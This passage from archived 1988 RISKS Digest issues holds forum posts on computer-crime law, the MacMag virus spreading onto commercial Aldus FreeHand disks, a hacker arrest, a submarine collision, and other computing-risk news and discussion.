It struck me that here we may have a case of someone(s) using a
computer to deliberately complicate/obfuscate what they are doing not
only for profit but to avoid detection.  And, even when detected, the
use of a computer may have complicated things beyond the point where
the average juryperson can understand them.

--Alan Wexelblat
ARPA: WEX@MCC.COM
UUCP: {harvard, gatech, pyramid, &amp;c.}!sally!im4u!milano!wex

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Hackers to Face Jail or Fines
</A>
</H3>
<address>
Anne Morrison
&lt;<A HREF="mailto:munnari!murdu.oz.au!anne@uunet.UU.NET ">
munnari!murdu.oz.au!anne@uunet.UU.NET 
</A>&gt;
</address>
<i>
Tue, 15 Mar 88 11:07:30 EST
</i><PRE>

From the Age, Melbourne, Monday March 14 1988

  Computer Hackers to Face Jail or Fines
  
  Convicted computer hackers will face huge fines under new laws being prepared
  for Victoria.  The State Government is planning to create an offence of
  computer trespass, with a maximum fine of $2500, under a bill soon to be
  debated in Parliament. 
  
  The Attorney-General, Mr McCutcheon, said yesterday that while many computer 
  hackers were no more than technological voyeurs, there was a need for some 
  kind of deterrent.  He said the legislation was the first in Australia to 
  deal specifically with technological crime. 
  
  The Government had previously thought it sufficient to ensure that computer 
  hackers could be prosecuted if they altered or erased data, Mr McCutcheon 
  said.  But submissions from police, the computer industry and legal experts
  had led to the inclusion of penalties for hackers who simply looked at
  material after breaking into a computer system. 
  
  People were understandably concerned that hackers could gain access to 
  sensitive data of great commercial value or of a personal and private nature,
  Mr McCutcheon said.
  
  The new offence of computer trespass was similar to the offence of willful 
  trespass on property or being unlawfully on premises.  The bill before
  Parliament also creates offences of falsifying or altering data held in a
  computer system, punishable by fines of up to $100,000 or 10 years jail. 
  
  Existing laws applying to criminal damage will be applied to technological 
  crime, enabling prosecution of anyone releasing "viruses" or "bugs" into 
  computer systems to cause damage.  People spreading these "viruses" or "logic
  bombs" -- programming instructions timed to destroy data later -- would face
  up to 10 years jail or a $100,000 fine, or 15 years jail if they acted for
  gain, Mr McCutcheon said. 

This raises an interesting point - does "accidentally" spreading a virus or
logic bomb (i.e. if you don't know it's there) make you liable for prosecution?
Can you prove that you passed on sabotaged software in good faith? This
legislation may prove to be a major deterrent to software piracy - IF it is 
strictly enforced.

Anne Morrison
University of Melbourne Computing Services, Parkville, Victoria, AUSTRALIA
ACSnet: anne@murdu.mu.oz       ARPA: anne%murdu.mu.oz.au@uunet.uu.net

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
1. Risk in submarine accident
</A>
</H3>
<address>
Klaus Brunnstein 
&lt;<A HREF="mailto:brunnstein%rz.informatik.uni-hamburg.dbp.de@RELAY.CS.NET">
brunnstein%rz.informatik.uni-hamburg.dbp.de@RELAY.CS.NET
</A>&gt;
</address>
<i>

</i><PRE>
         2. MAC Virus arrives in Germany  
         3. German Hacker arrested in Paris
Organisation: University of Hamburg, FRG, Faculty for Informatics

1. Electronic Navigation Aids fail on German Submarine?

According to German newsmedia, the collision of a German submarine (NATO
code:  S 176) on March 6, 1988 with the Norwegian oil-drilling platform
Oseberg B in the North Sea Ekofisk field was caused either by `human
failure' or by undetected malfunctioning of a previously `repaired'
navigation aid.  The submarine had a first collision with one leg of the
platform in 30 m depth; when trying to escape by diving to the 115 m deep
North Sea bottom at that point, several more collisions occured with legs
and iron chains, which anchor this platform and the neighboring `hotel
platform Polyconfidence', floating 40 m away. The collisions continued for
over 15 minutes and were experienced by the platform's workers as `some kind
of seaquake'. Some report said that the platform has been checked and is
again operational but workers must leave it when waves become 15 m high
(instead of 30 m before accident). The damage of the platform is reported to
coast `several 10 Mill.DM'.

After the heavily damaged boat returned to it's naval base at Kiel, FRG, the
commanding "Captain Lieutenant" (`Kaleu') argued that he had `seen' the
platform, through his periscope, 15 minutes before the collision and he was
sure, that his course would keep him clear of the platform. Probably, no
further 'visual control' of the subsequent course had been undertaken.

Norwegian media reports that German official seacharts don't register the two
platforms are incorrect; the president of the German office responsible for
updating seacharts said that updates show every change in position. Such
updates are stored electronically, but avalailable (today) only in printed
form.  Electronic devices and methods are being prepared, in close
collaboration with IMO (I have close contact to this group and inform them on
risks experienced in electronic air traffic aids).

Since this chart is 1:750.000, German navy vessels use detailed British special
charts on stationary or movable oil-drilling platforms. On the other hand,
navigation is difficult there due to strong tidal flows; every responsible
captain uses therefore as much information and sources as possible, including
computerized device and `eye contact'.

The commander reported that an electronic navigation aid, probably a sonar
detector, had been repaired shortly before.  Details of cross-check procedures
and spare devices have not been reported, but most interestingly, the commander
said in a press conference that usually several persons `indepently' steer the
boat, thus `human failure' was extremely improbable to him and navy officials.
An examination has been started (I will report the results to RISK FORUM).

Apart from the risk of overreliance on (badly checked) hardware, the behaviour
of officers and crew presents another risk.  While the commander argued, that
his crew behaved in a calm and controlled manner, the helmsman of a nearby
working Norwegian supply vessel, Mr. Per Rogne, reportedly said:  `the
commander and his officers were totally confused' when they finally came back
to surface. Norwegian newspapers reported on `blockheads of German submarines
which meet the only obstacle in a large area', but they added that a Norwegian
submarine recently had damaging `contact' with a wall of rock'.

While the risk to the crew seems `calculable', the public risk accorded to
such officer's may be the worse problem. The boat belongs to the NATO fleet
to protect Western Europe from sea invasion from North-East of Norway.

(Maybe, Norwegian workers should be better protected against unforeseen,
illegal visits of friends.)


2. MAC-virus arrived in Germany:

Surprisingly fast, Apple Germany found out about the MacInVirus and informed
it's users by email with the following text (cited without permission):

  `A product manager in Apple Germany, Kurt Bierbaum (BIERBAUM1) has found a
  disk in Germany which destroys hard disks and the applications that run on
  them.

  `This program is called VIRUS. I believe that it installs something in the
  CODE resources of the System file. In addition, it installs INIT32 and the
  resource MVIR in the System file.  I think that it installs the MVIR
  resource in the applications as well. I have the disk in my office if you
  would like a copy.  This program can be found on CompuServe in a Hypercard
  stack.  A user named David HM Spector sent this information to all other
  users. ...... This program seems to be widespread.'

With this rather quick information, Apple reacted much faster than DEC did
in 1987 when the missing CLOSE in the password control routine in it's VMS
4.4/4.5 versions was detected, with well known results of hackers invading
science and commercial VAX-systems (e.g. Philips France, see 3.). Though DEC
people knew of the severe fault since early 1987 (if not before), a proper
system patch was only available, in Germany, by summer 1987. Moreover, DEC
missed to inform the respective German computer center heads properly.


3. German leading `Computer Chaos Hacker' arrested in Paris

A leading German hacker, Mr. Steffen Wernery of `Computer Chaos Club' of
Hamburg, has been arrested in Paris, on March 14.  He is accused of having
participated in the invasion of a Philips France VAX computer (under a
`buggy' VNS) in 1987; while being a speaker at SECURICOM, Philips officials
had arranged a meeting, but police awaited him before. French police wanted
to arrest Mr.Wernery since some time, but German institutions refused to
deport him due to German law.

After having done some analysis of CCC's respective activities, to me the
arrest seems rather arbitrary; the invaded system evidently lacked any
reasonable protection, and the particip- ation of Mr. Wernery seems
doubtful, at least he has only superficial knowledge of VAX/VMS.

(To be precise: I don't wish to help hackers in cases of criminal actions;
but the analysis of what they do and what they can should be based on facts.
I would hope that police concentrates itself on real damages done by
professional computer criminals; but I admit that is more difficult to
understand their actions than that of hackers.)


Klaus Brunnstein, University of Hamburg, Faculty for Informatics

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
RISKS in the U.S. Government Archives
</A>
</H3>
<address>
&lt;<A HREF="mailto:sco!sethk@ucscc.UCSC.EDU">
sco!sethk@ucscc.UCSC.EDU
</A>&gt;
</address>
<i>

</i><PRE>
Date: Tue Mar 15 11:32:03 1988

&gt;From The Nation, March 12, 1988, p. 332, "Beltway Bandits" column.

Archive's Black Hole

The government is in danger of losing its memory. That's the message of Don
Wilson, the Federal Archivist. Testifying before a House subcommittee last
month, Wilson emphasized the problems posed by the "increased usage of
electronic records and the expanded use of computers in the Federal
Government." He complained that "data held on computers is frequently
altered or updated" - shades of the deeds done by Oliver North and Fawn Hall
- and that much material never reaches the National Archives. While the
government uses an estimated 13 million reels of computer tape, the archives
now holds only 3,000 reels. All this hinders the National Archives and
Records Administration in preserving the documents generated by each
presidency. Unless Congress and NARA find a way to address these matters,
the bureacracy's broadening reliance on computer technology will rob the
public of pieces of history as well as information that may be needed by a
future independent counsel or Congressional committee.

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
MacMag virus infects commercial software
</A>
</H3>
<address>
Dave Platt
&lt;<A HREF="mailto:dplatt@coherent.com ">
dplatt@coherent.com 
</A>&gt;
</address>
<i>
Tue, 15 Mar 88 09:13:14 PST
</i><PRE>

According to an article in this morning's San Jose Mercury News, the "DREW"
INIT-virus has been found to have infected a commercial software product.

The virus, which was a "benign" time-bomb designed to display a message of
world peace on March 2nd, is present on disks containing Aldus Freehand.
The virus was inadvertently passed to Aldus by Marc Canter, president of
MacroMind Inc., which makes training disks for Aldus.  Canter avisited
Canada some time ago, and was given a disk containing a program called
"Mr. Potato Head", which lets users play with a computerized version of the
toy character.  Canter ran the program only once, and his machine was
apparently infected by the virus at this time.  Subsequently, the virus
infected a disk of training software that Canter then delivered to Aldus;
at Aldus, the virus infected disks that were then sold to customers.

Although this virus was believed to be harmless, Canter reports that it forced
his Macintosh II computer to shut down and caused him to lose some computer
information.  "My system crashed," Canter said, "I was really angry."

	(( Not all that surprising... quite a few popular but nonstandard
           programming tricks used on the classic Mac don't work on the Mac II
           due to its different video card/monitor architecture...  many
           games, etc. don't run on the II for this reason and can cause some
           very impressive system crashes...  dcp ))

Canter fears that more of his customers may have been infected by the virus.
MacroMind's clients include Microsoft Corp., Lotus Development Corp., Apple
Computer Inc. and Ashton-Tate.

Microsoft has determined that none of its software has been infected, a
company spokeswoman said.  Apple and Lotus could not be reached for comment.
Ashton-Tate declined to comment.

Aldus would not comment on how many copies of FreeHand are infected, but
admits that a disk-duplicating machine copied the infected disk for three
days.  Half of the infected disks have been distributed to retail outlets;
the other half are in Aldus' warehouse.

Aldus will replace the infected disks with new, uninfected copies to any
FreeHand buyer who requests it, according to Aldus spokeswoman Laury Bryant.
The company will also replace the infected disks in its warehouse.

	(( As I recall, the DREW virus infects the System file on affected
           disks, but doesn't affect applications directly.  I suppose that
           Aldus could salvage the damaged disks by replacing the System
           folders with copies from a locked, uninfected disk... but it'll
           probably be faster for them to simply erase and reduplicate.

	   I have no idea what Canadian liability laws are like these days...
           but I rather suspect that if MacMag were a United States company
           rather than a Canadian one, its publisher would now be extremely
           vulnerable to a liability-and-damages suit of some sort.  This
           escapade will probably cost Aldus a pretty piece of change in
           damage-control expenses and perhaps loss-of-sales or injury-to-
           reputation.

           Kids, don't try this sort of thing at home!    	--- dcp ))

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
More on the Brandow virus                        [ANOTHER VERSION]
</A>
</H3>
<address>
Dave Curry
&lt;<A HREF="mailto:davy@intrepid.ecn.purdue.edu ">
davy@intrepid.ecn.purdue.edu 
</A>&gt;
</address>
<i>

</i><PRE>
Date: Wed, 16 Mar 88 08:39:15 EST

From the Lafayette (IN) Journal &amp; Courier, 3/16/88, p. A-12:

Publisher blamed for computer virus

  SEATTLE (AP) - Officials at Seattle's Aldus Corp. are blaming the publisher
of a Canadian computer magazine for a rogue computer program virus that has
popped up in commercial software, apparently for the first time.
  Richard Brandow, publisher of *MacMag* in Montreal, acknowledged Tuesday that
he wrote the so-called "March 2 peace message," but said he did so to point out
the dangers of software piracy.
  The relatively benign virus was discovered in FreeHand, a new program Aldus
developed for Apple Macintosh computers, according to spokeswoman Laury Bryant.
It apparently did not harm any computers and only flashed a brief message on
the computer screen.
  Nevertheless, the virus forced Aldus to recall or rework thousands of pack-
ages of the new software and has prompted the company to threaten legal action.
  It also has sent a scare through the computer industry because of the manner
in which the virus apparently spread and because it challenged the previous
belief that off-the-shelf software largely was immune.
  "We feel that Richard Brandow's actions deserve to be condemned by every
member of the Macintosh community," Bryant said.

    [ description of what a virus is and warnings about getting software
      from bulletin boards ]

  The Aldus virus also caused consternation because several of the nation's
largest software companies are clients of a [sic] MacroMind, Inc. of Chicago,
a subcontractor that inadvertently spread the virus to Aldus.
  Brandow said the full message read: "Richard Brandow, the publisher of
MacMag, and its entire staff would like to take this opportunity to convey
their universal message of peace to all Macintosh users around the world."
Beneath that was a graphic of the globe.
  Brandow and Bryant said the virsu erased itself after March 2, the anniver-
sary of the introduction of Apple's Macintosh SE and Macintosh II models.
  MacroMind president Marc Canter said Tuesday that he believed Aldus was the
only customer that received the virus.
  Among Canter's clients are the nation's three largest software producers -
Microsoft Corp. of Redmond, Ashton-Tate, and Lotus Development Corp. - and
Apple.
  Ashton-Tate declined comment, but officials at Microsoft, Apple and Lotus all
said none of their software was infected.

--Dave Curry, Purdue University

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6.43.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.45.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-80</DOCNO>
<DOCOLDNO>IA012-000129-B044-24</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.45.html 128.240.150.127 19970217020136 text/html 29571
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:59:49 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 45</TITLE>
<LINK REL="Prev" HREF="/Risks/6.44.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.46.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.44.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.46.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 45</H1>
<H2>  Thursday 17 March 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Tax penalty 
</A>
<DD>
<A HREF="#subj1.1">
Bob Larson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Arete': Risks in Names -- RX for Confusion 
</A>
<DD>
<A HREF="#subj2.1">
PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Trusting aircraft instruments 
</A>
<DD>
<A HREF="#subj3.1">
Spencer Garrett
</A><br>
<A HREF="#subj3.2">
 Steve Philipson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Hidden bugs from language extensions 
</A>
<DD>
<A HREF="#subj4.1">
William Smith
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Date formats 
</A>
<DD>
<A HREF="#subj5.1">
Cormac O'Reilly
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  MacMag virus a SubGenius plot? 
</A>
<DD>
<A HREF="#subj6.1">
Prentiss Riddle
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Re: Dangers of Wyse Terminals 
</A>
<DD>
<A HREF="#subj7.1">
Douglas Jones
</A><br>
<A HREF="#subj7.2">
 Jim Frost
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Virus file requests 
</A>
<DD>
<A HREF="#subj8.1">
Robert Slade
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  "NOPLATE" and "NONE" 
</A>
<DD>
<A HREF="#subj9.1">
Eric Norman
</A><br>
<A HREF="#subj9.2">
 lee
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj10">
  High-Tech Trucking 
</A>
<DD>
<A HREF="#subj10.1">
Michael Wagner
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj11">
  Architecting Telephone Systems 
</A>
<DD>
<A HREF="#subj11.1">
Graham Wilkinson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj12">
  Risks of using computers for Architectural Engineering 
</A>
<DD>
<A HREF="#subj12.1">
Steven Koinm
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Tax penalty
</A>
</H3>
<address>
Bob Larson
&lt;<A HREF="mailto:blarson%skat.usc.edu@oberon.usc.edu ">
blarson%skat.usc.edu@oberon.usc.edu 
</A>&gt;
</address>
<i>
Mon, 14 Mar 88 18:39:57 PST
</i><PRE>
Organization: USC AIS, Los Angeles

[Appogies on the quality of this, I'm doing it from memory.
Transcripts are available.]

From "The Nightly Business Report" (a PBS program) 3/14/88:

A penalty of over $400 was assessed on a tax underpayment of $0.02.  One IRS
spokesman blamed the computerization of the process of computing penalties,
then another blamed the add-hoc way the penalties were designed.

Bob Larson   Blarson@Ecla.Usc.Edu   {sdcrdcf,cit-vax}!oberon!skat!blarson
Prime:	info-prime-request%fns1@ecla.usc.edu 	oberon!fns1!info-prime-request

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Arete': Risks in Names -- RX for Confusion
</A>
</H3>
<address>
Peter G. Neumann 
&lt;<A HREF="mailto:NEUMANN@csl.sri.com">
NEUMANN@csl.sri.com
</A>&gt;
</address>
<i>
Wed 16 Mar 88 09:28:27-PST
</i><PRE>

On 21 March Arete' Systems Corp will be renamed to ARIX, which is closer to
UNIX, and which is also the name of their UNIX-based operating system.
Arete' had been named after the Greek word for excellence.  But "arete" also
means "earring" in Spanish, and "arrete'" means "stopped" in French ("not a
very good name for a computer company", says Caroline Carnefix, marketng
communications manager).  The difficulties in pronounciation and other
meanings apparently confused people.  Says Mike Lambert, marketing vice 
president, "We decided to change our name for the benefit of financial 
analysts and potential investors."               [So they could pronounce it!]

(This was noted by Vlae Kershner and Kathleen Pender in the "Business Insider"
column of today's S.F. Chronicle.  I presume they did not know of the computer
science and mathematical usage of "-arity" to indicate whether the radix is
binary, ternary, or whatever.  [One good ternary deserves an adder.]  PGN)

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Trusting aircraft instruments
</A>
</H3>
<address>
Spencer Garrett
&lt;<A HREF="mailto:srg@quick.com ">
srg@quick.com 
</A>&gt;
</address>
<i>
Tue, 15 Mar 88 00:01:24 PST
</i><PRE>

There are two issues at work here.  Pilots are indeed taught to cross-check
instruments and to look out the windows whenever conditions would permit
seeing something.  (Except pilots of big jets, but that's another issue.)
What they MUST NOT do, however, is trust their own sense of balance when
they cannot see the horizon.  Our bodies are not adapted to accelerated
motions in three-dimensional space, and one's perception of up and down when
flying in instrument conditions (eg - in the clouds) will NOT be correct.
It takes a great deal of training to learn to ignore the feeling that you're
rolling to the left when the instruments say otherwise, but that's what you
have to do.  

</PRE>
<HR><H3><A NAME="subj3.2">
Trusting aircraft instruments (Re: <A HREF="/Risks/6.42.html">RISKS-6.42</A>)
</A>
</H3>
<address>
&lt;<A HREF="mailto:Steve Philipson <steve@ames-aurora.arpa> ">
Steve Philipson &lt;steve@ames-aurora.arpa&gt; 
</A>&gt;
</address>
<i>
Mon, 14 Mar 88 11:13:54 PST
</i><PRE>

In RISKS DIGEST 6.42, Robert Dorsett writes:

&gt; On the 747-400, Airbus A320 (and the forthcoming A340), MD-11 (the DC-10
&gt; derivative) and, to a lesser degree, the Boeing 757 and 767, the pretense of
&gt; electromechanical instruments has been done away with altogether, and 
&gt; replaced with CRT displays, under the assumption that the CRT displays are 
&gt; less prone to failures...

   Many new display formats are being evaluated and tested.  Trend
information is being displayed in some formats by dedicated trend indicators.

   First generation EFIS (CRT) displays were simply electronic
representations of mechanical instruments.  While these displays were
sometimes criticized for being unimaginative and archaic, they preserved a
large body of experience on display design.  Our old instrument formats were
derived through a long series of trials and sometimes painful errors.

&gt;               ...              The Boeing philosophy thus far has been to
&gt; simplify overall design and efficiency by introducing automation; the Airbus
&gt; philosophy has been to redefine the role of the pilot in the cockpit while
&gt; simultaneously changing the way information is displayed.  ...

   What we are trying to do now is redesign the entire information link
between aircraft systems and the pilot, while also changing the nature of
the pilot's task.  We don't have much experience in designing visual
languages, particularly for critical, high technology applications.  We also
are not mature in design of human-monitored complex systems.  We are likely
to re-learn some lessons and undoubtedly learn some new ones.  With new
systems come new failure modes -- the answers to our old problems bring new
problems.  This is what RISKS is all about.

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Hidden bugs from language extensions
</A>
</H3>
<address>
William Smith
&lt;<A HREF="mailto:wsmith@b.cs.uiuc.edu ">
wsmith@b.cs.uiuc.edu 
</A>&gt;
</address>
<i>
Tue, 15 Mar 88 00:07:24 CST
</i><PRE>

I just stumbled on a bug that was difficult for me to locate because
it was unfamiliar to me and had no obvious symptoms except that the
output was (inexplicably) wrong.

In C I had a printf statement that printed a string and a number.  The
string was found by indexing an array.  I could not understand why
the number was always wrong.  I debugged the rest of the code and still
could not find where the variable was being set wrong.  It wasn't.  The
array was not an array of strings, but instead an array of structures
with the first element of each structure being a string.  I passed the 
structure so its second field was used as the number.  C now allows 
structures to be passed as arguments.  Printf has no type checking on its 
arguments with lint, so I received no diagnostics suggesting that I was 
using printf incorrectly.

The factors that contributed to the difficulty of finding this bug were
that there were no diagnostics from the error-checking that C provides
and also that this was an unfamiliar bug category.  I kept looking over the
problem because I assumed that a simple printf statement could not
be the problem.  By adding the useful feature of passing structures
as parameters to C, a new class of bugs has been created.  In this case,
the class is small enough to slip through the type checking system. 
As other languages are changed or created, the designers may miss subtly
erroneous programs that are an interaction of several (seemingly) unrelated
features in the language.  Are there any other examples of this idea?

Bill Smith    [{pur-ee|ihnp4}!uiucdcs!wsmith] [wsmith@a.cs.uiuc.edu]

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Date formats (RE: <A HREF="/Risks/6.43.html">RISKS-6.43</A>)
</A>
</H3>
<address>
Cormac O'Reilly - 713-240-3670 
&lt;<A HREF="mailto:OREILLY%aslvx6.sdr.slb.com@RELAY.CS.NET">
OREILLY%aslvx6.sdr.slb.com@RELAY.CS.NET
</A>&gt;
</address>
<i>
Tue, 15 Mar 88 16:16 EDT
</i><PRE>

A suggestion on date formats. When I was at school in England we were always
told to write dates with the month as a Roman numeral. Today, there are a
few people left who do this in England. It is a good way of avoiding the
international confusion. Mind you, I get some funny looks at my US bank when
I cash checks -- Cormac O'Reilly 15/III/1988

     [Beware the I-des of March.  That is nice unless you don't CROSS 
     YOUR EYES carefully, in which case 11 III 88 would also cause grief.  
     When in Rome, do as the Romans do.  Europeans still use that scheme.  PGN]

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
MacMag virus a SubGenius plot?
</A>
</H3>
<address>
Prentiss Riddle
&lt;<A HREF="mailto:ut-sally!im4u!woton!riddle@uunet.uu.net ">
ut-sally!im4u!woton!riddle@uunet.uu.net 
</A>&gt;
</address>
<i>

</i><PRE>
Date: 12 Mar 88 23:58:47 GMT
Organization: Shriners Burns Institute, Galveston

The following appeared in a Houston paper on February 14th this year.
I'm surprised no one has reported seeing anything like it.  I've edited
out the information in the article already familiar to RISKS readers.

   'ARTISTIC VIRUS' INSINUATES ITSELF INTO MAC WORLD by John Markoff
   (Hearst News Service)
   
   A computer program designed by adherents to a loose-knit philosophy
   called the Church of the SubGenius is creating an uproar on the
   nation's largest computer-information system, whose managers fear
   the program may cause widespread destruction.  [...]
   
   The programmers, who publish a magazine called MacMag in Montreal,
   said they had launched the "virus" in December.  [...]
   
   The Church of the SubGenius is an ill-defined group of sometime
   pranksters that began in Texas as, in the words of one writer, a
   "monotheistic new UFO cult in the 1950s" and has become a
   "polytheistic grab-bag in the 1980s."
   
   In other words, said David Spector, a New York University programmer
   whose computer was infected by the virus, "they're a bunch of
   high-tech looney-tunes." [...]
   
   Kevin Kelley, an editor of the Whole Earth Review, a Sausalito,
   Calif., magazine, said the Church of the SubGenius had begun as a
   spoof on fundamentalist religions but later had taken on aspects of
   a religious cult in its own right.  Its founder, a shadowy Texan
   named J.R. "Bob" Dobbs, died in 1985. 

Nowhere does the article explain the supposed connection between MacMag
and the Church of the SubGenius.  Are Peter Lount and Richard Brandow
(named in the article as the resposible persons at MacMag) really
SubGenii?  If so, why have no other accounts mentioned that?  The whole
article reeks to me of a clever press release by a SubG somewhere -- as
far as I know, the Church began in the late 70s or early 80s, not in the
50s, and "Bob" Dobbs is entirely imaginary.  If the author of the article
fell for the Church's myths about its origins, I wonder what else he fell
for. 

The RISKS?  First, that not everything you hear about viruses should be
believed.  Second, if the SubGenii *have* decided to get into the virus
business, then hang onto your hats -- there are some wild and crazy
chaos-mongers running around out there. 

-- Prentiss Riddle
-- Opinions expressed are not necessarily those of my employer.
-- riddle%woton.uucp@cs.utexas.edu  {ihnp4,uunet}!ut-sally!im4u!woton!riddle

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Re: Dangers of Wyse Terminals
</A>
</H3>
<address>
Douglas Jones 
&lt;<A HREF="mailto:jones%cs.uiowa.edu@RELAY.CS.NET">
jones%cs.uiowa.edu@RELAY.CS.NET
</A>&gt;
</address>
<i>
Mon, 14 Mar 88 09:55:11 CST
</i><PRE>

A. Cunningham asked:  Why do terminals have remote modes to lock the keyboard?

In these days of full-duplex communication, it is easy to forget that once
upon a time, all of the available fast modems were half-duplex, and were
required to use a line-turnaround protocol to change from one direction of
data travel to another.  Many terminals were built with provisions to lock
and unlock the keyboard to simplify line-turnaround (from the user's view).
The first character in any transmission from the mainframe would be "lock
keyboard", and the last character after typing a prompt would be "unlock
keyboard".

Protecting yourself from "letter bombs" which lock your keyboard or do other
nasty things is not hard.  Just make your mail reader filter all output through
a filter that removes all control characters from the mail  (I'm pretty sure
that the UNIX more filter can be made to do this.  Of course, this
doesn't protect you from other sources of nasty output to the terminal.
A specific threat in a teaching institution is student assignments that,
when run by the instructor, send nasty control sequences to the terminal.

It is sad that the solution to all of these problems is quite old but hardly
ever used:  Put the filter in the device driver, not in the application
program.  On the SIMPLER system built by the Medical Computing Lab at the
University of Illinois at Urbana, between 1973 and 1980, we did this, putting
much of the functionality usually associated with the UNIX curses package in
the device driver, so that all applications programs dealt with a single
virtual terminal protocol, and all device specific control sequence translation
was done by the system.  It worked beautifully, and the cost was quite
acceptable in a timesharing environment.  (This solution is outlined in some
detail in my 1976 MS Thesis, "Run-Time Support for the Tutor Language on a
Small Computer System" (University of Illinois Computer Science Technical
Report UIUCDCS-R-77-868, May 1977) Section 6.5 and Appendix E.)
                                                               Douglas W. Jones

</PRE>
<HR><H3><A NAME="subj7.2">
Dangers of Intelligent Terminals (A. Cunningham, RISKS Volume 6.42)
</A>
</H3>
<address>
Jim Frost
&lt;<A HREF="mailto:madd@bu-cs.BU.EDU ">
madd@bu-cs.BU.EDU 
</A>&gt;
</address>
<i>
16 Mar 88 03:49:09 GMT
</i><PRE>
Organization: Boston University Distributed Systems Group

The described effects are extremely easy to do on a variety of common terminals
(eg VT220 terminals).  There are codes that the terminal recognizes to set
